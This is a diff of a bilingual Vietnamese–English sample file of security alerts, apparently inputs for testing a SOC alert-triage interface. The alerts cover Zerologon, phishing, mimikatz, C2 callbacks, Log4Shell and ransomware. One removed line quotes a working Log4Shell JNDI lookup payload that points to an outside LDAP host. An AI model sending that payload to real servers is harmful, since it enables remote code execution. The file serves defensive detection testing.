@@ -1,53 +1,74 @@
-# Copy từng dòng vào ô 'Nhập Alert (Free Text)' trên giao diện
-# Mỗi dòng là một alert riêng biệt
+Phát hiện khai thác lỗ hổng CVE-2020-1472 (Zerologon) từ IP 185.220.101.42 nhắm vào máy WIN-DC01.
+Zerologon exploitation detected. CVE-2020-1472 targeting host WIN-DC01 from IP 185.220.101.42.
 
-CVE-2020-1472 (Zerologon) exploitation attempt từ IP 185.220.101.42 nhắm vào domain controller WIN-DC01
+Phát hiện email độc hại từ attacker@malicious.io gửi đến ceo@company.vn với tệp đính kèm Invoice_2024.exe.
+Malicious email detected from attacker@malicious.io to ceo@company.vn with attachment Invoice_2024.exe.
 
-Email từ attacker@malicious.io gửi tới ceo@company.vn với attachment Invoice_2024.exe — người dùng đã mở file
+Phát hiện powershell.exe chạy lệnh mã hóa Base64 trên máy WIN-PC01.
+[EN] Malicious PowerShell execution detected. Process powershell.exe executed an encoded command on WIN-PC01.
 
-Powershell.exe chạy lệnh mã hóa base64 trên WIN-PC01, commandLine chứa -enc và -nop — khả năng cao là malicious script loader
+[VN] Tài khoản k8s-svc truy cập Kubernetes Secrets trên máy K8S-NODE01.k8s.internal.
+[EN] Suspicious Kubernetes activity. User k8s-svc accessed secrets on host K8S-NODE01.k8s.internal.
 
-Bất thường nghiêm trọng: tài khoản k8s-svc truy cập pod secrets trên K8S-NODE01.k8s.internal lúc 4AM, sau đó lateral move sang gke-node-01 và đọc /etc/shadow
+[VN] Phát hiện brute-force SSH từ IP 45.33.32.156 vào máy SRV-WEB01 với tài khoản guest.
+[EN] SSH brute-force detected from IP 45.33.32.156 targeting user guest on host SRV-WEB01.
 
-Brute-force SSH từ IP 45.33.32.156 nhắm vào SRV-WEB01, đã thử 500 lần trong 5 phút, tài khoản guest bị khai thác thành công
+[VN] Tài khoản admin truy cập trái phép S3 bucket arn:aws:s3:::sensitive-bucket-prod.
+[EN] Unauthorized AWS access detected. User admin accessed cloud resource arn:aws:s3:::sensitive-bucket-prod.
 
-Tài khoản admin truy cập S3 bucket arn:aws:s3:::sensitive-bucket-prod từ IP bên ngoài lúc nửa đêm — không có change request nào
+[VN] Phát hiện đăng nhập bất thường của tài khoản svc-backup vào máy WIN-PC01.
+[EN] Suspicious login detected. User svc-backup logged into host WIN-PC01.
 
-Cảnh báo: tài khoản svc-backup đăng nhập vào WIN-PC01 lúc 02:15 UTC — bất thường vì account này thường chỉ chạy batch job ban ngày
+[VN] Phát hiện tải dữ liệu từ bucket arn:aws:s3:::backup-logs-archive tới IP 203.0.113.10.
+[EN] Possible data exfiltration detected from cloud resource arn:aws:s3:::backup-logs-archive to IP 203.0.113.10.
 
-Phát hiện exfiltration: 50GB data từ arn:aws:s3:::backup-logs-archive được tải về IP 203.0.113.10 trong 20 phút
+[VN] certutil.exe tải payload từ URL http://malware-download.net/dropper.ps1 trên máy SRV-WEB01.
+[EN] LOLBIN abuse detected. Process certutil.exe downloaded payload from http://malware-download.net/dropper.ps1 on host SRV-WEB01.
 
-certutil.exe bị lạm dụng để tải file từ http://malware-download.net/dropper.ps1 về máy SRV-WEB01, đây là dấu hiệu LOLBIN abuse
+[VN] Chuỗi tấn công: IP 185.220.101.42 xâm nhập WIN-DC01, chạy mimikatz.exe rồi di chuyển sang SRV-FILE01.
+[EN] Multi-stage attack detected. IP 185.220.101.42 compromised WIN-DC01, executed mimikatz.exe, then moved laterally to SRV-FILE01.
 
-Tấn công chuỗi: 185.220.101.42 brute-force vào admin@corp.local → đăng nhập WIN-DC01 → chạy mimikatz.exe → lateral move sang SRV-FILE01 → exfil 30GB qua port 443
+[VN] Phát hiện mimikatz.exe chạy trên WIN-DC01.
+[EN] Credential dumping detected. Process mimikatz.exe executed on host WIN-DC01.
 
-Phát hiện mimikatz.exe chạy với quyền SYSTEM trên WIN-DC01 — nghi ngờ kẻ tấn công đang dump credential từ LSASS
+[VN] Phát hiện nhiều lần đăng nhập thất bại từ IP 185.220.101.42 nhắm vào tài khoản admin trên WIN-DC01.
+[EN] Multiple failed logins detected from IP 185.220.101.42 targeting user admin on WIN-DC01.
 
-Phát hiện đăng nhập đáng ngờ lúc 3 giờ sáng từ IP nước ngoài 185.220.101.42 vào domain controller WIN-DC01, tài khoản admin bị khóa sau 15 lần thất bại
+[VN] Người dùng nghia đăng nhập thành công vào SRV-FILE01 từ IP 203.0.113.10.
+[EN] User nghia successfully logged into SRV-FILE01 from IP 203.0.113.10.
 
-User nghia đăng nhập thành công vào SRV-FILE01 từ địa chỉ IP 203.0.113.10 không thuộc dải mạng nội bộ
+[VN] Phát hiện kết nối Command & Control tới URL http://185.220.101.42:8080/cmd bởi người dùng nghia@company.vn.
+[EN] Command-and-Control communication detected. User nghia@company.vn accessed URL http://185.220.101.42:8080/cmd.
 
-Phát hiện traffic HTTP tới http://185.220.101.42:8080/cmd từ user nghia@company.vn — URL có pattern của command-and-control
+[VN] Phát hiện khai thác Log4Shell CVE-2021-44228 trên máy SRV-WEB01.
+[EN] Log4Shell exploitation detected. CVE-2021-44228 targeting host SRV-WEB01.
 
-Alert CVE-2021-44228 (Log4Shell): request JNDI lookup ${jndi:ldap://91.108.4.1/a} phát hiện trong log SRV-WEB01
+[VN] Hoạt động APT khai thác CVE-2021-44228, powershell.exe tải payload từ http://evil-c2.onion.ws/payload và truy cập bucket arn:aws:s3:::sensitive-bucket-prod.
+[EN] APT activity detected. CVE-2021-44228 exploited SRV-WEB01. Process powershell.exe downloaded payload from http://evil-c2.onion.ws/payload and accessed cloud resource arn:aws:s3:::sensitive-bucket-prod.
 
-APT activity: CVE-2021-44228 exploit từ 91.108.4.1 vào SRV-WEB01 → spawn powershell.exe download payload từ evil-c2.onion.ws → C2 callback qua DNS tunneling → truy cập S3 bucket sensitive-bucket-prod
+[VN] Phát hiện Business Email Compromise từ domain evil-corp.com gửi đến finance@company.vn.
+[EN] Business Email Compromise detected. Email from evil-corp.com targeted finance@company.vn.
 
-Business email compromise: email từ domain evil-corp.com giả mạo CFO yêu cầu chuyển khoản khẩn
+[VN] Phát hiện khai thác Follina CVE-2022-30190, tiến trình msdt.exe được khởi chạy trên WIN-PC01.
+[EN] Follina exploitation detected. CVE-2022-30190 spawned process msdt.exe on WIN-PC01.
 
-CVE-2022-30190 (Follina/msdt): WINWORD.EXE spawn msdt.exe trên WIN-PC01, user mở file Word độc hại qua email phishing
+[VN] Email phishing từ phishing@evil-corp.com nhắm vào finance@company.vn.
+[EN] Spear phishing detected. Email phishing@evil-corp.com targeted finance@company.vn.
 
-Spear phishing phát hiện: phishing@evil-corp.com mạo danh HR gửi link đổi mật khẩu giả tới finance@company.vn
+[VN] Máy WIN-PC01 kết nối ra IP 91.108.4.1 qua cổng 4444.
+[EN] Suspicious outbound connection detected from WIN-PC01 to IP 91.108.4.1 on port 4444.
 
-Máy WIN-PC01 kết nối ra ngoài tới IP 91.108.4.1 cổng 4444 — đây là dải IP Tor exit node, nghi C2 callback
+[VN] Ransomware bắt đầu từ email attacker@malicious.io, tải URL http://phish-bank.tk và mã hóa máy SRV-FILE01.corp.local.
+[EN] Ransomware activity detected. Email attacker@malicious.io delivered phishing URL http://phish-bank.tk resulting in encryption of SRV-FILE01.corp.local.
 
-Ransomware activity: attacker@malicious.io gửi phishing → user nghia click link phish-bank.tk → download dropper.ps1 → mã hóa toàn bộ SRV-FILE01.corp.local
+[VN] EC2 i-0abcd1234efgh5678 truy cập trái phép AWS Secrets Manager arn:aws:secretsmanager:ap-southeast-1:123456789012:secret:prod-db.
+[EN] Unauthorized AWS Secrets Manager access. EC2 instance i-0abcd1234efgh5678 accessed cloud resource arn:aws:secretsmanager:ap-southeast-1:123456789012:secret:prod-db.
 
-API call GetSecretValue vào AWS Secrets Manager từ EC2 instance i-0abcd1234efgh5678 tại vùng ap-southeast-1 — instance này không được phép đọc secret
+[VN] Tiến trình wscript.exe khởi chạy cmd.exe trên máy K8S-NODE01.
+[EN] Suspicious script execution detected. Process wscript.exe launched cmd.exe on host K8S-NODE01.
 
-wscript.exe spawn cmd.exe trên K8S-NODE01 từ thư mục Temp, hash file chưa có trong whitelist
+[VN] Phát hiện DNS tunneling tới domain evil-c2.onion.ws từ máy SRV-FILE01.
+[EN] DNS tunneling suspected. Host SRV-FILE01 communicated with domain evil-c2.onion.ws.
 
-DNS query bất thường từ SRV-FILE01 tới domain evil-c2.onion.ws với tần suất 30 giây một lần — dấu hiệu DNS tunneling
-
-PrintNightmare CVE-2021-34527: spoolsv.exe load DLL lạ từ path UNC \\185.220.101.42\share — privilege escalation attempt
-
+[VN] Phát hiện khai thác PrintNightmare CVE-2021-34527 tải DLL từ \\185.220.101.42\share trên WIN-DC01.
+[EN] PrintNightmare exploitation detected. CVE-2021-34527 loaded a malicious DLL from \\185.220.101.42\share on WIN-DC01.
